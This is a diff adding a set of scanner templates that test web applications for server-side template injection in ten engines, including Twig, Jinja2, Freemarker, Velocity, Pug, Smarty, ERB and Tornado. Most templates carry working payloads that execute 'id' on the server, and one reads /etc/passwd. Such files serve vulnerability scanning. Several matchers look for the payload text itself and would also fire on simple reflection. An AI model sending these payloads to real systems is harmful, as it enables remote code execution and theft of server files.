@@ -1,0 +1,202 @@
+id: ssti-math-test
+info:
+  name: SSTI Math Expression Test
+  author: AniipID
+  severity: medium
+  description: Detects template injection via math expression evaluation
+  tags: ssti,template-injection
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name={{7*7}}"
+      - "{{BaseURL}}?name=${7*7}"
+      - "{{BaseURL}}?name=<%= 7*7 %>"
+      - "{{BaseURL}}?name=#{7*7}"
+      - "{{BaseURL}}?name={{7*7|safe}}"
+    matchers:
+      - type: regex
+        regex:
+          - "49"
+          - "\\*\\*"
+        condition: or
+        name: "ssti-math-evaluated"
+---
+id: ssti-twig
+info:
+  name: SSTI Twig Template Engine
+  author: AniipID
+  severity: critical
+  description: Detects Twig template injection leading to RCE
+  tags: ssti,twig,php
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+      - "{{BaseURL}}?name={{['id']|filter('system')}}"
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "_self.env"
+        condition: or
+        name: "twig-ssti"
+---
+id: ssti-jinja2
+info:
+  name: SSTI Jinja2 Template Engine
+  author: AniipID
+  severity: critical
+  description: Detects Jinja2 template injection in Python/Flask apps
+  tags: ssti,jinja2,python,flask
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name={{config}}"
+      - "{{BaseURL}}?name={{''.__class__.__mro__[1].__subclasses__()}}"
+      - "{{BaseURL}}?name={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
+    matchers:
+      - type: regex
+        regex:
+          - "SECRET_KEY"
+          - "SQLALCHEMY"
+          - "__class__"
+          - "root:.*:0:0:"
+        condition: or
+        name: "jinja2-ssti"
+---
+id: ssti-freemarker
+info:
+  name: SSTI Freemarker Template Engine
+  author: AniipID
+  severity: critical
+  description: Detects Freemarker template injection in Java apps
+  tags: ssti,freemarker,java
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name=${7*7}"
+      - "{{BaseURL}}?name=${T(java.lang.Runtime).getRuntime().exec('id')}"
+    matchers:
+      - type: word
+        words:
+          - "49"
+          - "T(java.lang."
+        condition: or
+        name: "freemarker-ssti"
+---
+id: ssti-velocity
+info:
+  name: SSTI Apache Velocity
+  author: AniipID
+  severity: critical
+  description: Detects Apache Velocity template injection
+  tags: ssti,velocity,java
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name=#set($x=7*7)$x"
+      - "{{BaseURL}}?name=#set($x='')$x.class.forName('java.lang.Runtime').getRuntime().exec('id')"
+    matchers:
+      - type: word
+        words:
+          - "#set($x="
+        name: "velocity-ssti"
+---
+id: ssti-jade-pug
+info:
+  name: SSTI Jade/Pug Template Engine
+  author: AniipID
+  severity: critical
+  description: Detects Jade/Pug template injection in Node.js apps
+  tags: ssti,jade,pug,nodejs
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name=#{7*7}"
+      - "{{BaseURL}}?name=#{\"\".__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}"
+    matchers:
+      - type: word
+        words:
+          - "__proto__"
+        name: "jade-pug-ssti"
+---
+id: ssti-smarty
+info:
+  name: SSTI Smarty Template Engine
+  author: AniipID
+  severity: critical
+  description: Detects Smarty template injection in PHP apps
+  tags: ssti,smarty,php
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name={system('id')}"
+      - "{{BaseURL}}?name={exec('id')}"
+    matchers:
+      - type: word
+        words:
+          - "{system("
+          - "uid="
+        condition: or
+        name: "smarty-ssti"
+---
+id: ssti-erb-ruby
+info:
+  name: SSTI ERB Ruby Template
+  author: AniipID
+  severity: critical
+  description: Detects ERB template injection in Ruby/Rails apps
+  tags: ssti,erb,ruby,rails
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name=<%= 7*7 %>"
+      - "{{BaseURL}}?name=<%= system('id') %>"
+    matchers:
+      - type: word
+        words:
+          - "49"
+          - "system('id')"
+        condition: or
+        name: "erb-ssti"
+---
+id: ssti-jsp-el
+info:
+  name: SSTI JSP EL Injection
+  author: AniipID
+  severity: critical
+  description: Detects JSP Expression Language injection
+  tags: ssti,jsp,el,java
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name=${7*7}"
+      - "{{BaseURL}}?name=${pageContext.request.contextPath}"
+      - "{{BaseURL}}?name=${session.getAttribute('user')}"
+    matchers:
+      - type: word
+        words:
+          - "pageContext"
+          - "session"
+        condition: or
+        name: "jsp-el-ssti"
+---
+id: ssti-tornado
+info:
+  name: SSTI Tornado Template Engine
+  author: AniipID
+  severity: critical
+  description: Detects Tornado template injection in Python apps
+  tags: ssti,tornado,python
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name={% import os %}{{os.system('id')}}"
+      - "{{BaseURL}}?name={% import subprocess %}{{subprocess.check_output('id')}}"
+    matchers:
+      - type: word
+        words:
+          - "{% import"
+          - "import os"
+        condition: or
+        name: "tornado-ssti"
